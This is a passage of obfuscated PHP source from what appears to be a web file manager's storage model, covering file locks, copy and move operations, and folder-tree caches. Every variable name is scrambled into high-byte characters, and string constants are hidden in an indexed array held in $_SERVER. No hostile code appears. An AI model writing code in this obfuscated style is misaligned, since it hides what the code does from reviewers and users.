$this->_lockEvent($È›¯¸ô‚, array($ş¸­ŒÚ½[585], $ş¸­ŒÚ½[586]), $ıõÔÊ°Ü); $this->_lockParent($È›¯¸ô‚, array($ş¸­ŒÚ½[586]), $ıõÔÊ°Ü); $this->_lockEvent($È›¯¸ô‚, array($ş¸­ŒÚ½[587], $ş¸­ŒÚ½[588]), $ıõÔÊ°Ü); } public function lockWriteStart($‰®ÓÁ¡µ, $‚È¿ˆè‹ = '') { $‚êì¼¯š =& $_SERVER[ªÏ§Ë·]; if (!$this->allowLock()) { return; } $this->_lockCheck($‚êì¼¯š[585], $‰®ÓÁ¡µ); $Œéµúâ¾ = 1; $this->_lockKey($‚êì¼¯š[589] . $‰®ÓÁ¡µ . $‚êì¼¯š[10] . $‚È¿ˆè‹, $Œéµúâ¾); $this->_lockEvent($‰®ÓÁ¡µ, array($‚êì¼¯š[584], $‚êì¼¯š[586]), $Œéµúâ¾); $this->_lockParent($‰®ÓÁ¡µ, array($‚êì¼¯š[584], $‚êì¼¯š[586]), $Œéµúâ¾); $this->_lockCheckEnd($‚êì¼¯š[585], $‰®ÓÁ¡µ); } public function lockWriteEnd($òØÕñ´Ú, $ºÎ€¸Ç = '') { $–Ğë­ÊÉ =& $_SERVER[ªÏ§Ë·]; if (!$this->allowLock()) { return; } $–ÖË¯ƒ… = 0; $this->_lockKey($–Ğë­ÊÉ[589] . $òØÕñ´Ú . $–Ğë­ÊÉ[10] . $ºÎ€¸Ç, $–ÖË¯ƒ…); $this->_lockEvent($òØÕñ´Ú, array($–Ğë­ÊÉ[584], $–Ğë­ÊÉ[586]), $–ÖË¯ƒ…); $this->_lockParent($òØÕñ´Ú, array($–Ğë­ÊÉ[584], $–Ğë­ÊÉ[586]), $–ÖË¯ƒ…); } public function lockMoveStart($¥±é‹ğà) { $Ü§ôØ‡Ú =& $_SERVER[ªÏ§Ë·]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ü§ôØ‡Ú[586], $¥±é‹ğà); $å†äì¸ğ = 1; $this->_lockKey($Ü§ôØ‡Ú[590] . $¥±é‹ğà, $å†äì¸ğ); $this->_lockEvent($¥±é‹ğà, array($Ü§ôØ‡Ú[584], $Ü§ôØ‡Ú[585]), $å†äì¸ğ); $this->_lockParent($¥±é‹ğà, array($Ü§ôØ‡Ú[584], $Ü§ôØ‡Ú[586]), $å†äì¸ğ); $this->_lockEvent($¥±é‹ğà, array($Ü§ôØ‡Ú[591], $Ü§ôØ‡Ú[587], $Ü§ôØ‡Ú[588]), $å†äì¸ğ); $this->_lockCheckEnd($Ü§ôØ‡Ú[586], $¥±é‹ğà); } public function lockMoveEnd($Šœö·â) { $‰ÈßÙæ± =& $_SERVER[ªÏ§Ë·]; if (!$this->allowLock()) { return; } $¦æ”½ß = 0; $this->_lockKey($‰ÈßÙæ±[590] . $Šœö·â, $¦æ”½ß); $this->_lockEvent($Šœö·â, array($‰ÈßÙæ±[584], $‰ÈßÙæ±[585]), $¦æ”½ß); $this->_lockParent($Šœö·â, array($‰ÈßÙæ±[584], $‰ÈßÙæ±[586]), $¦æ”½ß); $this->_lockEvent($Šœö·â, array($‰ÈßÙæ±[591], $‰ÈßÙæ±[587], $‰ÈßÙæ±[588]), $¦æ”½ß); } private function _lockCheck($”€¯æš, $ñ´Úı™š) { $Ù¿¦Ó» =& $_SERVER[ªÏ§Ë·]; $¶ÆÜ½Ø¦ = $this->sourceInfo($ñ´Úı™š); $œ®ºà¸Õ = $”€¯æš . $Ù¿¦Ó»[10] . $ñ´Úı™š; $this->_lockTimeStart[$œ®ºà¸Õ] = timeFloat(); if (!is_array($¶ÆÜ½Ø¦)) { return; } $ë—ã’´ = LNG($Ù¿¦Ó»[592]); CacheLock::setErrorMsg($Ù¿¦Ó»[172] . htmlspecialchars($¶ÆÜ½Ø¦[$Ù¿¦Ó»[42]]) . $Ù¿¦Ó»[174] . $ë—ã’´); $this->_lockKey($œ®ºà¸Õ, 1); $this->_lockKey($œ®ºà¸Õ, 0); $ÇÂÚáø = array_reverse($this->parentLevelArray($¶ÆÜ½Ø¦[$Ù¿¦Ó»[549]])); foreach ($ÇÂÚáø as $™´’Ü¤ñ) { $œ®ºà¸Õ = $”€¯æš . $Ù¿¦Ó»[593] . $™´’Ü¤ñ; if (CacheLock::lockGet($Ù¿¦Ó»[594] . $œ®ºà¸Õ)) { $¶ÆÜ½Ø¦ = $this->sourceInfo($™´’Ü¤ñ); CacheLock::setErrorMsg($Ù¿¦Ó»[172] . htmlspecialchars($¶ÆÜ½Ø¦[$Ù¿¦Ó»[42]]) . $Ù¿¦Ó»[174] . $ë—ã’´); $this->_lockKey($œ®ºà¸Õ, 1); $this->_lockKey($œ®ºà¸Õ, 0); } } } private function _lockCheckEnd($ÉŸçú²½, $â‰Ğ³£ë) { $ºãØßáº =& $_SERVER[ªÏ§Ë·]; $¡ş¹µë = $ÉŸçú²½ . $ºãØßáº[10] . $â‰Ğ³£ë; CacheLock::setErrorMsg($ºãØßáº[416]); if (!isset($this->_lockTimeStart[$¡ş¹µë])) { return; } $ëµÇ‘…’ = timeFloat() - $this->_lockTimeStart[$¡ş¹µë]; unset($this->_lockTimeStart[$¡ş¹µë]); if ($ëµÇ‘…’ > 0.5) { unset(self::$cacheSourceInfo[$ºãØßáº[498] . $â‰Ğ³£ë]); } $†ÅÅéÒ— = $this->sourceInfo($â‰Ğ³£ë); if (!$†ÅÅéÒ—) { show_json(LNG($ºãØßáº[115]), !1); } } private function _lockParent($—¶¤¾ÕÍ, $®³Êøµ, $İ®éıÓ) { if (!$this->autoLockSet) { return; } $¬Î¥Û¥¶ = $this->sourceInfo($—¶¤¾ÕÍ); if (!is_array($¬Î¥Û¥¶)) { return; } $´ã›´Éñ = array_reverse($this->parentLevelArray($¬Î¥Û¥¶[$_SERVER[ªÏ§Ë·][549]])); foreach ($´ã›´Éñ as $Ì²ĞÊ­Ö) { $this->_lockEvent($Ì²ĞÊ­Ö, $®³Êøµ, $İ®éıÓ); } } private function _lockEvent($˜Ìñ·«×, $¼»Ó¿øó, $Ÿ¿àÒªù) { $İó˜óÑ =& $_SERVER[ªÏ§Ë·]; if (!$this->autoLockSet) { return; } foreach ($¼»Ó¿øó as $ÒÖíÌİÑ) { $“±ÎÁÅ = $ÒÖíÌİÑ . $İó˜óÑ[10] . $˜Ìñ·«×; if ($Ÿ¿àÒªù && CacheLock::lockGet($İó˜óÑ[594] . $“±ÎÁÅ)) { continue; } $this->_lockKey($“±ÎÁÅ, $Ÿ¿àÒªù); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÏæìÃô–, $Œ†Ş£Â± = 1) { $¼é‹ö¦£ = $_SERVER[ªÏ§Ë·][594] . md5($ÏæìÃô–); if ($Œ†Ş£Â±) { if (isset(self::$_lockItemArr[$¼é‹ö¦£])) { return; } self::$_lockItemArr[$¼é‹ö¦£] = 1; CacheLock::lock($¼é‹ö¦£, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¼é‹ö¦£])) { return; } unset(self::$_lockItemArr[$¼é‹ö¦£]); CacheLock::unlock($¼é‹ö¦£); } } public function isParentOf($õ”ùÏé¤, $“ÒÆ©Í) { $×“åäÎÚ =& $_SERVER[ªÏ§Ë·]; $„Èèèˆô = $this->sourceInfo($õ”ùÏé¤); $’©ÏÂåâ = $this->sourceInfo($“ÒÆ©Í); $±Ğö¦‚Š = $„Èèèˆô[$×“åäÎÚ[549]] . $„Èèèˆô[$×“åäÎÚ[440]] . $×“åäÎÚ[60]; $ÛÛı¬¦î = $’©ÏÂåâ[$×“åäÎÚ[549]] . $’©ÏÂåâ[$×“åäÎÚ[440]] . $×“åäÎÚ[60]; $ÇÊªó¯¦ = strpos($ÛÛı¬¦î, $±Ğö¦‚Š) === 0; return $ÇÊªó¯¦; } private $targetIsDelete = 0; public function copy($Ù®œ®õŞ, $€á†ò§í, $€§’€şĞ = REPEAT_REPLACE, $˜–£Ì˜ = '') { $ã—–¨¾ö =& $_SERVER[ªÏ§Ë·]; $§ªÅİ¼ä = $this->sourceInfo($Ù®œ®õŞ); $Ìªôœäú = $this->sourceInfo($€á†ò§í); if (!$§ªÅİ¼ä || !$Ìªôœäú || $Ìªôœäú[$ã—–¨¾ö[448]] != $ã—–¨¾ö[98]) { return !1; } if ($this->isParentOf($Ù®œ®õŞ, $€á†ò§í)) { return !1; } $³ášÆÄõ = $˜–£Ì˜ ? $˜–£Ì˜ : $§ªÅİ¼ä[$ã—–¨¾ö[42]]; $this->lockCopyStart($Ù®œ®õŞ); $this->lockWriteStart($€á†ò§í, $³ášÆÄõ); $÷†ÏÉºû = array($ã—–¨¾ö[595] => array(), $ã—–¨¾ö[596] => array(), $ã—–¨¾ö[597] => array()); $this->targetIsDelete = intval($§ªÅİ¼ä[$ã—–¨¾ö[469]]); $¾ËÁ“ªÓ = $this->fileNameExistCache($€á†ò§í, $§ªÅİ¼ä[$ã—–¨¾ö[42]]); $çŒ˜î¸¤ = $this->_copy($Ù®œ®õŞ, $€á†ò§í, $€§’€şĞ, $÷†ÏÉºû, !0, $˜–£Ì˜); $this->_childrenListClear(); $this->lockCopyEnd($Ù®œ®õŞ); $this->lockWriteEnd($€á†ò§í, $³ášÆÄõ); if ($§ªÅİ¼ä[$ã—–¨¾ö[448]] == $ã—–¨¾ö[98] && $¾ËÁ“ªÓ == $çŒ˜î¸¤) { $this->folderSizeResetChildren($¾ËÁ“ªÓ); } Model($ã—–¨¾ö[598])->addAll($÷†ÏÉºû[$ã—–¨¾ö[596]], array(), !0); if ($¾ËÁ“ªÓ != $çŒ˜î¸¤ || $§ªÅİ¼ä[$ã—–¨¾ö[448]] == $ã—–¨¾ö[98]) { Model($ã—–¨¾ö[599])->eventCopy($çŒ˜î¸¤); } $this->saveAll($÷†ÏÉºû[$ã—–¨¾ö[597]]); Model($ã—–¨¾ö[210])->linkAdd($÷†ÏÉºû[$ã—–¨¾ö[595]]); $this->folderSizeReset($€á†ò§í); $this->updateModifyTime($€á†ò§í); return $çŒ˜î¸¤; } private function _copy($œëö±›§, $ÏÚàô¹ä, $í¨±ĞÆÖ, &$¼ßÓÄ§«, $·Ÿ­´ÏÃ, $Îåõ¨µê = '') { $ŠÙå‡²ñ =& $_SERVER[ªÏ§Ë·]; $¬ó°Ïì¼ = $this->sourceInfoCache($œëö±›§); $ıïÎĞ»Ÿ = $¬ó°Ïì¼[$ŠÙå‡²ñ[448]] == $ŠÙå‡²ñ[98]; $¿ª®À”¶ = $Îåõ¨µê ? $Îåõ¨µê : $¬ó°Ïì¼[$ŠÙå‡²ñ[42]]; $«Á‡­ã¾ = $this->fileNameExistCache($ÏÚàô¹ä, $¿ª®À”¶); if ($·Ÿ­´ÏÃ) { $this->_childrenAllMake($œëö±›§); if ($ıïÎĞ»Ÿ && $«Á‡­ã¾) { $this->_childrenAllMake($«Á‡­ã¾); } } if (!$«Á‡­ã¾) { return $this->_copyCreate($œëö±›§, $ÏÚàô¹ä, $¿ª®À”¶, $¼ßÓÄ§«); } $ı”—Á‘É = $«Á‡­ã¾; if ($ıïÎĞ»Ÿ) { if ($í¨±ĞÆÖ == REPEAT_RENAME_FOLDER) { $¿ª®À”¶ = $this->fileNameAutoCache($ÏÚàô¹ä, $¿ª®À”¶, $í¨±ĞÆÖ, $ıïÎĞ»Ÿ); $ı”—Á‘É = $this->_copyCreate($œëö±›§, $ÏÚàô¹ä, $¿ª®À”¶, $¼ßÓÄ§«); } else { $˜œ™ŒŸ = $this->_childrenList($œëö±›§); foreach ($˜œ™ŒŸ as $ıÅ¨Ğú) { $this->_copy($ıÅ¨Ğú[$ŠÙå‡²ñ[440]], $«Á‡­ã¾, $í¨±ĞÆÖ, $¼ßÓÄ§«, !1); } } } else { if ($í¨±ĞÆÖ == REPEAT_RENAME || $í¨±ĞÆÖ == REPEAT_RENAME_FOLDER) { $¿ª®À”¶ = $this->fileNameAutoCache($ÏÚàô¹ä, $¿ª®À”¶, $í¨±ĞÆÖ, $ıïÎĞ»Ÿ); $ı”—Á‘É = $this->_copyCreate($œëö±›§, $ÏÚàô¹ä, $¿ª®À”¶, $¼ßÓÄ§«); } else { if ($í¨±ĞÆÖ == REPEAT_REPLACE) { $â°ÖšÃŒ = $this->sourceInfoCache($«Á‡­ã¾); $¥š¢ƒ‹ã = $this->fileHistory($â°ÖšÃŒ, $¬ó°Ïì¼[$ŠÙå‡²ñ[506]], $¬ó°Ïì¼[$ŠÙå‡²ñ[86]]); if ($¥š¢ƒ‹ã) { $¼ßÓÄ§«[$ŠÙå‡²ñ[595]][] = $¬ó°Ïì¼[$ŠÙå‡²ñ[506]]; } } else { if ($í¨±ĞÆÖ == REPEAT_SKIP) { } } } Hook::trigger($ŠÙå‡²ñ[600], array($ŠÙå‡²ñ[601], $¬ó°Ïì¼, 0)); } return $ı”—Á‘É; } private function _copyCreate($¬Ä¯¶­, $”ÈÓºØ , $®­­×ò, &$äàİóşĞ) { $’‚ØÓàˆ =& $_SERVER[ªÏ§Ë·]; $¬´ËÖ¹Ñ = $this->sourceInfoCache($¬Ä¯¶­); $°¼©Ş = $this->sourceInfoCache($”ÈÓºØ ); $ï„İëØá = $this->_makeItemData($¬´ËÖ¹Ñ, $°¼©Ş, $®­­×ò); Hook::trigger($’‚ØÓàˆ[602], $ï„İëØá); Hook::trigger($’‚ØÓàˆ[603], array($’‚ØÓàˆ[604], $ï„İëØá, 0)); $¿Æª‚¢ø = $this->add($ï„İëØá); $™£“³£’ = array($’‚ØÓàˆ[440] => $¿Æª‚¢ø, $’‚ØÓàˆ[42] => $®­­×ò); $this->_copyApplyMeta($™£“³£’, $äàİóşĞ); if ($¬´ËÖ¹Ñ[$’‚ØÓàˆ[448]] != $’‚ØÓàˆ[98]) { $äàİóşĞ[$’‚ØÓàˆ[595]][] = $¬´ËÖ¹Ñ[$’‚ØÓàˆ[506]]; return $¿Æª‚¢ø; } $’åÓ“Ò = array(); $´Å…ìĞ = array(); $this->_childrenListAll($¬Ä¯¶­, $’åÓ“Ò); $šá°ñ©Ÿ = count($’åÓ“Ò); if ($šá°ñ©Ÿ == 0) { return $¿Æª‚¢ø; } $¿ÎÇì¶ = $this->sourceInfo($¿Æª‚¢ø); foreach ($’åÓ“Ò as $¸·øŠ) { $À«ä²íƒ = $this->_makeItemData($¸·øŠ, $¿ÎÇì¶, $¸·øŠ[$’‚ØÓàˆ[42]]); $À«ä²íƒ[$’‚ØÓàˆ[549]] = $¸·øŠ[$’‚ØÓàˆ[549]]; $´Å…ìĞ[] = $À«ä²íƒ; } $this->chunkEventSet($’‚ØÓàˆ[605], array($’‚ØÓàˆ[606], $ï„İëØá, $šá°ñ©Ÿ)); $this->addAll($´Å…ìĞ, array(), !1); $‡Ø‚±¥ = $this->where(array($’‚ØÓàˆ[470] => $¿Æª‚¢ø))->select(); $¬¶îªµ¾ = $this->_childrenMakeRelation($’åÓ“Ò, $‡Ø‚±¥); $¬¶îªµ¾[$¬Ä¯¶­] = $¿Æª‚¢ø; $Åºï”ì‹ = array(); $©„Ï¦Àæ = array(); foreach ($‡Ø‚±¥ as $¸·øŠ) { $ÃòÄï˜‘ = $¸·øŠ[$’‚ØÓàˆ[440]]; $ÏüÇ¦çÛ = $this->_childrenMatch($¬¶îªµ¾, $¸·øŠ, $¿ÎÇì¶); $Åºï”ì‹[] = array($’‚ØÓàˆ[440], $ÃòÄï˜‘, $’‚ØÓàˆ[470], $ÏüÇ¦çÛ[$’‚ØÓàˆ[470]]); $©„Ï¦Àæ[] = array($’‚ØÓàˆ[440], $ÃòÄï˜‘, $’‚ØÓàˆ[549], $ÏüÇ¦çÛ[$’‚ØÓàˆ[549]]); $this->_copyApplyMeta($¸·øŠ, $äàİóşĞ); if ($¸·øŠ[$’‚ØÓàˆ[448]] != $’‚ØÓàˆ[98]) { $äàİóşĞ[$’‚ØÓàˆ[595]][] = $¸·øŠ[$’‚ØÓàˆ[506]]; } } $this->chunkEventSet($’‚ØÓàˆ[607], array($’‚ØÓàˆ[608], $ï„İëØá, $šá°ñ©Ÿ)); $this->saveAll($Åºï”ì‹); $this->chunkEventSet($’‚ØÓàˆ[609], array($’‚ØÓàˆ[610], $ï„İëØá, $šá°ñ©Ÿ)); $this->saveAll($©„Ï¦Àæ); return $¿Æª‚¢ø; } private function _childrenMakeRelation($¸Ä¤Œ¿¼, $ÆÈ–â˜•) { $Ï›ïõ»å =& $_SERVER[ªÏ§Ë·]; $ßƒøÊ—İ = array(); $Ê¤õõİ = array(); foreach ($¸Ä¤Œ¿¼ as $ªÅ‰®ÕŒ) { $²¬´œû = $ªÅ‰®ÕŒ[$Ï›ïõ»å[42]] . $Ï›ïõ»å[8] . $ªÅ‰®ÕŒ[$Ï›ïõ»å[549]]; $ßƒøÊ—İ[$²¬´œû] = $ªÅ‰®ÕŒ[$Ï›ïõ»å[440]]; } foreach ($ÆÈ–â˜• as $ªÅ‰®ÕŒ) { $²¬´œû = $ªÅ‰®ÕŒ[$Ï›ïõ»å[42]] . $Ï›ïõ»å[8] . $ªÅ‰®ÕŒ[$Ï›ïõ»å[549]]; $ËÍı£¥  = $ßƒøÊ—İ[$²¬´œû]; $Ê¤õõİ[$ËÍı£¥ ] = $ªÅ‰®ÕŒ[$Ï›ïõ»å[440]]; } return $Ê¤õõİ; } private function _childrenMatch($¾¢ÛÄ‘ˆ, $ôı¹©ü¶, $ÂÑŠ¥èí) { $Ãšë„ ñ =& $_SERVER[ªÏ§Ë·]; $ò§ÇÃ™Î = $ÂÑŠ¥èí[$Ãšë„ ñ[549]]; $Şœ´¯º = $this->parentLevelArray($ôı¹©ü¶[$Ãšë„ ñ[549]]); foreach ($Şœ´¯º as $èÑô Ë) { if (isset($¾¢ÛÄ‘ˆ[$èÑô Ë])) { $ò§ÇÃ™Î .= $¾¢ÛÄ‘ˆ[$èÑô Ë] . $Ãšë„ ñ[611]; } } $ò§ÇÃ™Î = rtrim($ò§ÇÃ™Î, $Ãšë„ ñ[60]) . $Ãšë„ ñ[60]; $ –ı“‡· = $this->parentLevelArray($ò§ÇÃ™Î); $ş½Ñïš = $ –ı“‡·[count($ –ı“‡·) - 1]; return array($Ãšë„ ñ[470] => $ş½Ñïš, $Ãšë„ ñ[549] => $ò§ÇÃ™Î); } private function _makeItemData($¯ÙŠ’å¯, $¦¨Ğèºƒ, $ØˆíÖ¿²) { $Æ‚áˆö½ =& $_SERVER[ªÏ§Ë·]; $ÚÓÍ—‡ = array($Æ‚áˆö½[612] => $¯ÙŠ’å¯[$Æ‚áˆö½[448]], $Æ‚áˆö½[458] => $ØˆíÖ¿², $Æ‚áˆö½[613] => $¯ÙŠ’å¯[$Æ‚áˆö½[450]] ? $¯ÙŠ’å¯[$Æ‚áˆö½[450]] : $Æ‚áˆö½[12], $Æ‚áˆö½[507] => $¯ÙŠ’å¯[$Æ‚áˆö½[506]] ? $¯ÙŠ’å¯[$Æ‚áˆö½[506]] : 0, $Æ‚áˆö½[583] => $¯ÙŠ’å¯[$Æ‚áˆö½[86]] ? $¯ÙŠ’å¯[$Æ‚áˆö½[86]] : 0, $Æ‚áˆö½[614] => intval($¦¨Ğèºƒ[$Æ‚áˆö½[449]]), $Æ‚áˆö½[615] => intval($¦¨Ğèºƒ[$Æ‚áˆö½[534]]), $Æ‚áˆö½[616] => intval(USER_ID), $Æ‚áˆö½[617] => intval(USER_ID), $Æ‚áˆö½[439] => intval($¦¨Ğèºƒ[$Æ‚áˆö½[440]]), $Æ‚áˆö½[618] => $¦¨Ğèºƒ[$Æ‚áˆö½[549]] . $¦¨Ğèºƒ[$Æ‚áˆö½[440]] . $Æ‚áˆö½[60], $Æ‚áˆö½[462] => $¯ÙŠ’å¯[$Æ‚áˆö½[95]] ? $¯ÙŠ’å¯[$Æ‚áˆö½[95]] : time(), $Æ‚áˆö½[468] => 0, $Æ‚áˆö½[619] => $Æ‚áˆö½[12]); return $ÚÓÍ—‡; } private function _copyApplyMeta($ø™ñ“œö, &$ú¸ôí¼ß) { $•äÀøŠè =& $_SERVER[ªÏ§Ë·]; $‘†Ë‡ ¬ = $ø™ñ“œö[$•äÀøŠè[440]]; $êÎ÷Âûµ = $ø™ñ“œö[$•äÀøŠè[42]]; if (!isset($ø™ñ“œö[$•äÀøŠè[620]]) || !$ø™ñ“œö[$•äÀøŠè[620]] || $ø™ñ“œö[$•äÀøŠè[620]] == $•äÀøŠè[208]) { $ú¸ôí¼ß[$•äÀøŠè[597]][] = array($•äÀøŠè[440], $‘†Ë‡ ¬, $•äÀøŠè[620], short_id($‘†Ë‡ ¬)); } if (Input::check($êÎ÷Âûµ, $•äÀøŠè[621])) { $ú¸ôí¼ß[$•äÀøŠè[596]][] = array($•äÀøŠè[440] => $‘†Ë‡ ¬, $•äÀøŠè[104] => $•äÀøŠè[503], $•äÀøŠè[412] => str_replace($•äÀøŠè[63], $•äÀøŠè[12], Pinyin::get($êÎ÷Âûµ))); $ú¸ôí¼ß[$•äÀøŠè[596]][] = array($•äÀøŠè[440] => $‘†Ë‡ ¬, $•äÀøŠè[104] => $•äÀøŠè[502], $•äÀøŠè[412] => Pinyin::get($êÎ÷Âûµ, $•äÀøŠè[622])); } $ú¸ôí¼ß[$•äÀøŠè[596]][] = array($•äÀøŠè[440] => $‘†Ë‡ ¬, $•äÀøŠè[104] => $•äÀøŠè[482], $•äÀøŠè[412] => KodSort::makeStr($êÎ÷Âûµ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¥ †ÃìØ) { $è½‚ÂÊ =& $_SERVER[ªÏ§Ë·]; $ÁŸ†Éª = $this->sourceInfo($¥ †ÃìØ); $¦ªÓš® = $è½‚ÂÊ[623]; $“òœâ–ë = array($è½‚ÂÊ[549] => array($è½‚ÂÊ[578], $ÁŸ†Éª[$è½‚ÂÊ[549]] . $¥ †ÃìØ . $è½‚ÂÊ[579]), $è½‚ÂÊ[469] => $this->targetIsDelete); $½ÕñŸŠ = $this->field($¦ªÓš®)->where($“òœâ–ë)->select(); if (!$½ÕñŸŠ) { return; } $½ÕñŸŠ = array_to_keyvalue($½ÕñŸŠ, $è½‚ÂÊ[440]); foreach ($½ÕñŸŠ as $¾ø©©ºö) { $ÃŞáöüÖ = $¾ø©©ºö[$è½‚ÂÊ[470]]; $¥ †ÃìØ = $¾ø©©ºö[$è½‚ÂÊ[440]]; if (!isset($this->_childrenListCache[$¥ †ÃìØ]) && $¾ø©©ºö[$è½‚ÂÊ[448]] == $è½‚ÂÊ[98]) { $this->_childrenListCache[$¥ †ÃìØ] = array(); } if (!isset($this->_childrenListCache[$ÃŞáöüÖ])) { $this->_childrenListCache[$ÃŞáöüÖ] = array(); } $this->_childrenListCache[$ÃŞáöüÖ][$¥ †ÃìØ] = $¾ø©©ºö; $this->_childrenItemCache[$¥ †ÃìØ] = $¾ø©©ºö; } } private function _childrenListAll($ÙÎ©æ×º, &$ü÷Â›ÍÀ) { $‚¼¾ñÎ =& $_SERVER[ªÏ§Ë·]; if (!isset($this->_childrenListCache[$ÙÎ©æ×º])) { return; } $Ö›ãê¼ = $this->_childrenListCache[$ÙÎ©æ×º]; foreach ($Ö›ãê¼ as $½ñÙı÷å => $Âº’†‘ğ) { $ü÷Â›ÍÀ[$½ñÙı÷å] = $Âº’†‘ğ; if ($Âº’†‘ğ[$‚¼¾ñÎ[448]] == $‚¼¾ñÎ[98]) { $this->_childrenListAll($½ñÙı÷å, $ü÷Â›ÍÀ); } } } private function sourceInfoCache($ƒÓíŠÚ›) { if (isset($this->_childrenItemCache[$ƒÓíŠÚ›])) { return $this->_childrenItemCache[$ƒÓíŠÚ›]; } return $this->sourceInfo($ƒÓíŠÚ›); } private function _childrenList($Ê¤ÇÅâè) { if (isset($this->_childrenListCache[$Ê¤ÇÅâè])) { return $this->_childrenListCache[$Ê¤ÇÅâè]; } return $this->_childrenListSelect($Ê¤ÇÅâè); } private function _childrenListSelect($Ñ¾…—…) { $ë²ïÅÀŞ =& $_SERVER[ªÏ§Ë·]; $®‹¼µ¿ó = array($ë²ïÅÀŞ[470] => $Ñ¾…—…, $ë²ïÅÀŞ[469] => $this->targetIsDelete); $ğçò¨‘ = $this->where($®‹¼µ¿ó)->select(); $ğçò¨‘ = $ğçò¨‘ ? $ğçò¨‘ : array(); $ú•ñöÌ¬ = array_to_keyvalue($ğçò¨‘, $ë²ïÅÀŞ[440]); $this->_childrenListCache[$Ñ¾…—…] = $ú•ñöÌ¬; foreach ($ú•ñöÌ¬ as $Ñ¾…—… => $–şª­â) { $this->_childrenItemCache[$Ñ¾…—…] = $–şª­â; } return $ú•ñöÌ¬; } private function fileNameExistCache($…ò‹¯¥´, $„‹Ÿ®Ñ) { $—»ííÕ­ =& $_SERVER[ªÏ§Ë·]; $„‹Ÿ®Ñ = strtolower($„‹Ÿ®Ñ); $öğ„š¶Ó = $this->_childrenList($…ò‹¯¥´); foreach ($öğ„š¶Ó as $¬¨Á°Ò») { if ($„‹Ÿ®Ñ == strtolower($¬¨Á°Ò»[$—»ííÕ­[42]])) { return $¬¨Á°Ò»[$—»ííÕ­[440]]; } } return !1; } private function fileNameAutoCache($±¹å¹šà, $æ§‘¯€, $Ğ¨¥“Ê, $®ÚÚÙØÜ) { $¹›ƒõÖµ =& $_SERVER[ªÏ§Ë·]; $ùçƒ§®¾ = $this->_childrenList($±¹å¹šà); $ë˜ç»Èş = array_to_keyvalue($ùçƒ§®¾, $¹›ƒõÖµ[12], $¹›ƒõÖµ[42]); return $this->fileNameAutoGet($ë˜ç»Èş, $æ§‘¯€, $Ğ¨¥“Ê, $®ÚÚÙØÜ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ Üï¯âÄ, $¢‘’»ñĞ, $‘ù‹îå¢ = REPEAT_REPLACE, $¢§òÛ² = '') { $ÄÉºãê =& $_SERVER[ªÏ§Ë·]; $»ì«Ööª = $this->sourceInfo($ Üï¯âÄ); $ŸŒêë¦ = $this->sourceInfo($¢‘’»ñĞ); if ($»ì«Ööª[$ÄÉºãê[470]] == $ŸŒêë¦[$ÄÉºãê[440]]) { if ($»ì«Ööª[$ÄÉºãê[469]] == $ÄÉºãê[98]) { Model($ÄÉºãê[467])->restore(array($ Üï¯âÄ)); } if (!$¢§òÛ² || $¢§òÛ² == $»ì«Ööª[$ÄÉºãê[42]]) { return $ Üï¯âÄ; } } $¶™³³Éâ = $this->pathInfoMore($ Üï¯âÄ); if ($this->isParentOf($ Üï¯âÄ, $¢‘’»ñĞ)) { return !1; } if (!$»ì«Ööª || !$ŸŒêë¦ || $ŸŒêë¦[$ÄÉºãê[448]] != $ÄÉºãê[98]) { return !1; } Hook::trigger($ÄÉºãê[624], $¶™³³Éâ); $this->targetIsDelete = intval($»ì«Ööª[$ÄÉºãê[469]]); if ($»ì«Ööª[$ÄÉºãê[470]] == $¢‘’»ñĞ && $¢§òÛ² != $»ì«Ööª[$ÄÉºãê[42]]) { $°ˆ°™€ = $this->fileNameExist($¢‘’»ñĞ, $¢§òÛ²); if ($°ˆ°™€ && $»ì«Ööª[$ÄÉºãê[448]] == $ÄÉºãê[208]) { $Óˆ€û†Ï = $this->sourceInfo($°ˆ°™€); $¾çÕü°’ = $this->fileHistory($Óˆ€û†Ï, $»ì«Ööª[$ÄÉºãê[506]], $»ì«Ööª[$ÄÉºãê[86]]); if (!$¾çÕü°’) { Model($ÄÉºãê[509])->remove($»ì«Ööª[$ÄÉºãê[506]]); } $this->removeNow($ Üï¯âÄ, !1); $this->folderSizeReset($¢‘’»ñĞ); Hook::trigger($ÄÉºãê[625], $¶™³³Éâ); return $°ˆ°™€; } } $Ä÷³Û¤Ê = $¢§òÛ² ? $¢§òÛ² : $»ì«Ööª[$ÄÉºãê[42]]; $this->lockMoveStart($ Üï¯âÄ); $this->lockWriteStart($¢‘’»ñĞ, $Ä÷³Û¤Ê); $£×°¢¾ = array($ÄÉºãê[595] => array(), $ÄÉºãê[626] => !1); $this->clearShare($ Üï¯âÄ, $¢‘’»ñĞ); $ƒÛİó»„ = $this->fileNameExistCache($¢‘’»ñĞ, $»ì«Ööª[$ÄÉºãê[42]]); $õÃçÒ…† = $this->_move($ Üï¯âÄ, $¢‘’»ñĞ, $‘ù‹îå¢, $£×°¢¾, $¢§òÛ²); $this->sourceCacheClear(); if ($»ì«Ööª[$ÄÉºãê[448]] == $ÄÉºãê[98] && $ƒÛİó»„) { $this->folderSizeResetChildren($õÃçÒ…†); } Model($ÄÉºãê[210])->linkAdd($£×°¢¾[$ÄÉºãê[595]]); if ($ƒÛİó»„ && $£×°¢¾[$ÄÉºãê[626]]) { $this->removeNow($ Üï¯âÄ, !1); } $this->lockMoveEnd($ Üï¯âÄ); $this->lockWriteEnd($¢‘’»ñĞ, $Ä÷³Û¤Ê); $this->folderSizeReset($»ì«Ööª[$ÄÉºãê[470]]); $this->folderSizeReset($¢‘’»ñĞ); $Åé—‰İ¾ = array($»ì«Ööª[$ÄÉºãê[470]], $¢‘’»ñĞ); if ($»ì«Ööª[$ÄÉºãê[448]] == $ÄÉºãê[98]) { $Åé—‰İ¾[] = $ Üï¯âÄ; } $this->updateModifyTime($Åé—‰İ¾); Model($ÄÉºãê[599])->eventMove($ Üï¯âÄ, $»ì«Ööª[$ÄÉºãê[470]], $¢‘’»ñĞ); Hook::trigger($ÄÉºãê[625], $¶™³³Éâ); return $õÃçÒ…†; } private function _move($½À²”÷Ç, $ó–ÚÏÚœ, $·®è¯è½, &$²¨Ñç°®, $ÊšïÅÕĞ = '') { $Î—äÇ¨â =& $_SERVER[ªÏ§Ë·]; $õòîµ„ = 